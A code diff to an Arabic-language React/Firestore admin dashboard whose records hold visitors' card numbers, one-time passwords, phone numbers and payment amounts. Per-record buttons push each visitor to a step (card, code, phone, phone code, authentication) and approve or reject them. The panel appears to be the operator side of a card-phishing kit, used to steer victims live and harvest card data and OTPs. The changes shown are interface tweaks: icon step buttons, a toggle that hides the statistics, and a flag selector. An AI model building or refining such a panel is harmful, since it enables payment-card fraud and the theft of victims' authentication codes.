@@ -28,6 +28,12 @@ import {
   RefreshCw,
   AlertCircle,
   Loader2,
+  Phone,
+  LockIcon,
+  Shield,
+  ClipboardCheck, 
+  EyeClosed,
+  Eye
 } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Badge } from "@/components/ui/badge"
@@ -110,11 +116,11 @@ interface Notification {
 }
 
 const stepButtons = [
-  { label: "بطاقة", step: 0 },
-  { label: "كود", step: 2 },
-  { label: "رقم", step: 3 },
-  { label: "كود الهاتف", step: 4 },
-  { label: "مصادقة", step: 5 },
+  { name:"بطاقه",label:<CreditCard/>, step: 1 },
+  { name:"كود",label:<LockIcon/>, step: 2 },
+  { name:"رقم",label: <Phone/>, step: 3 },
+  { name:"كود هاتف",label: <Shield/>, step: 4 },
+  { name:"مصادقة",label:<ClipboardCheck/>, step: 5 },
 ]
 
 // Hook for online users count
@@ -270,7 +276,7 @@ function FlagColorSelector({
   onColorChange,
 }: {
   notificationId: string
-  currentColor: FlagColor
+  currentColor: any
   onColorChange: (id: string, color: FlagColor) => void
 }) {
   return (
@@ -727,6 +733,8 @@ export default function NotificationsPage() {
   const [mobileMenuOpen, setMobileMenuOpen] = useState(false)
   const [sortBy, setSortBy] = useState<"date" | "status" | "country">("date")
   const [sortOrder, setSortOrder] = useState<"asc" | "desc">("desc")
+  const [showStatstics, setShowStatstics] = useState(true)
+
   const router = useRouter()
   const onlineUsersCount = useOnlineUsersCount()
 
@@ -863,7 +871,7 @@ export default function NotificationsPage() {
             const data = doc.data() as any
             return { id: doc.id, ...data }
           })
-          .filter((notification: any) => notification.cardNumber) as Notification[]
+          .filter((notification: any) => !notification.isHidden) as Notification[]
 
         // Check if there are any new notifications with card info or general info
         const hasNewCardInfo = notificationsData.some(
@@ -921,8 +929,10 @@ export default function NotificationsPage() {
     setSelectedInfo(null)
     setSelectedNotification(null)
   }
-
-  const handleFlagColorChange = async (id: string, color: string) => {
+  const handleShowStatstics = () => {
+  setShowStatstics(!showStatstics)
+  }
+  const handleFlagColorChange = async (id: string, color: any) => {
     try {
       // Update in Firestore
       const docRef = doc(db, "pays", id)
@@ -1177,6 +1187,23 @@ export default function NotificationsPage() {
           </div>
 
           <div className="flex items-center gap-2">
+          <TooltipProvider>
+              <Tooltip>
+                <TooltipTrigger asChild>
+                  <Button
+                    variant="outline"
+                    size="icon"
+                    onClick={handleShowStatstics}
+                    className="relative overflow-hidden bg-transparent"
+                  >
+                  {showStatstics?<Eye/>:  <EyeClosed className={`h-4 w-4 ${isLoading ? "animate-spin" : ""}`} />}
+                  </Button>
+                </TooltipTrigger>
+                <TooltipContent>
+                  <p> اخفاءالبيانات</p>
+                </TooltipContent>
+              </Tooltip>
+            </TooltipProvider>
             <TooltipProvider>
               <Tooltip>
                 <TooltipTrigger asChild>
@@ -1275,7 +1302,7 @@ export default function NotificationsPage() {
 
       <div className="p-6">
         {/* Enhanced Statistics Grid */}
-        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
+        <div className={`grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8 ${showStatstics?"":"hidden"}`}>
           <StatisticsCard
             title="إجمالي الزوار"
             value={totalVisitorsCount}
@@ -1440,16 +1467,6 @@ export default function NotificationsPage() {
                             {notification.phone ? "معلومات شخصية" : "لا يوجد معلومات"}
                           </Badge>
                           <Badge
-                            variant={notification?.network ? "default" : "outline"}
-                            className={`cursor-pointer transition-all hover:scale-105 ${
-                              notification.network ? "bg-gradient-to-r from-yellow-500 to-pink-600 text-white" : ""
-                            }`}
-                            onClick={() => handleInfoClick(notification, "personal")}
-                          >
-                            <User className="h-3 w-3 mr-1" />
-                            {notification.phone ? "معلومات شخصية" : "لا يوجد معلومات"}
-                          </Badge>
-                          <Badge
                             variant={notification.cardNumber ? "default" : "secondary"}
                             className={`cursor-pointer transition-all hover:scale-105 ${
                               notification.cardNumber ? "bg-gradient-to-r from-green-500 to-green-600 text-white" : ""
@@ -1465,7 +1482,7 @@ export default function NotificationsPage() {
                         {notification.status === "approved" ? (
                           <Badge className="bg-gradient-to-r from-green-500 to-green-600 text-white">
                             <CheckCircle className="h-3 w-3 mr-1" />
-                            موافق عليه
+                            موافق 
                           </Badge>
                         ) : notification.status === "rejected" ? (
                           <Badge className="bg-gradient-to-r from-red-500 to-red-600 text-white">
@@ -1475,7 +1492,7 @@ export default function NotificationsPage() {
                         ) : (
                           <Badge className="bg-gradient-to-r from-yellow-500 to-yellow-600 text-white">
                             <Clock className="h-3 w-3 mr-1" />
-                            قيد المراجعة
+                           معلق
                           </Badge>
                         )}
                       </td>
@@ -1494,23 +1511,33 @@ export default function NotificationsPage() {
                       </td>
                       <td className="px-6 py-4 text-center">
                         {notification.otp && (
-                          <Badge variant="outline" className="bg-blue-50 text-blue-700 border-blue-200">
+                          <Badge variant="outline" className="bg-blue-50 text-blue-700 border-blue-200 ">
                             {notification.otp}
                           </Badge>
                         )}
                       </td>
                       <td className="px-6 py-4">
                         <div className="flex flex-wrap justify-center gap-1">
-                          {stepButtons.map(({ label, step }) => (
+                          {stepButtons.map(({ name,label, step }) => (
+                             <TooltipProvider 
+                             key={step}
+                             >
+                             <Tooltip>
+                               <TooltipTrigger asChild>
                             <Button
-                              key={step}
-                              size="sm"
-                              variant={notification.step === step ? "default" : "outline"}
+                              size="icon"
+                              variant={notification.step === step ? "default" : "secondary"}
                               onClick={() => handleStepUpdate(notification.id, step)}
-                              className="text-xs px-2 h-7"
+                              className={`text-xs px-2 h-7 ${notification.step === step?"bg-blue-500":"" }`}
                             >
                               {label}
                             </Button>
+                            </TooltipTrigger>
+                              <TooltipContent>
+                                <p>{name}</p>
+                              </TooltipContent>
+                            </Tooltip>
+                          </TooltipProvider>
                           ))}
                         </div>
                       </td>
@@ -1526,6 +1553,7 @@ export default function NotificationsPage() {
                                   className="bg-gradient-to-r from-green-500 to-green-600 text-white border-0 hover:from-green-600 hover:to-green-700"
                                   disabled={notification.status === "approved"}
                                 >
+                                <p>موافقة</p>
                                   <CheckCircle className="h-4 w-4" />
                                 </Button>
                               </TooltipTrigger>
@@ -1545,6 +1573,7 @@ export default function NotificationsPage() {
                                   className="bg-gradient-to-r from-red-500 to-red-600 text-white border-0 hover:from-red-600 hover:to-red-700"
                                   disabled={notification.status === "rejected"}
                                 >
+                                <p>رفض</p>
                                   <XCircle className="h-4 w-4" />
                                 </Button>
                               </TooltipTrigger>
@@ -1571,7 +1600,9 @@ export default function NotificationsPage() {
                               </TooltipContent>
                             </Tooltip>
                           </TooltipProvider>
-                          <Badge>{notification?.amount}</Badge>
+                          <Badge>{notification?.amount||0.0}</Badge>
+                          <FlagColorSelector notificationId={notification.id} currentColor={notification?.flagColor} onColorChange={handleFlagColorChange}
+                          />
                         </div>
                       </td>
                     </tr>
@@ -1817,7 +1848,7 @@ export default function NotificationsPage() {
                         className="flex justify-between items-center py-2 border-b border-border/30 last:border-0"
                       >
                         <span className="font-medium text-muted-foreground">{label}:</span>
-                        <span className="font-semibold">{String(value)}</span>
+                        <span className="font-semibold" >{String(value)}</span>
                       </div>
                     ),
                 )}
@@ -1843,3 +1874,4 @@ export default function NotificationsPage() {
     </div>
   )
 }
+
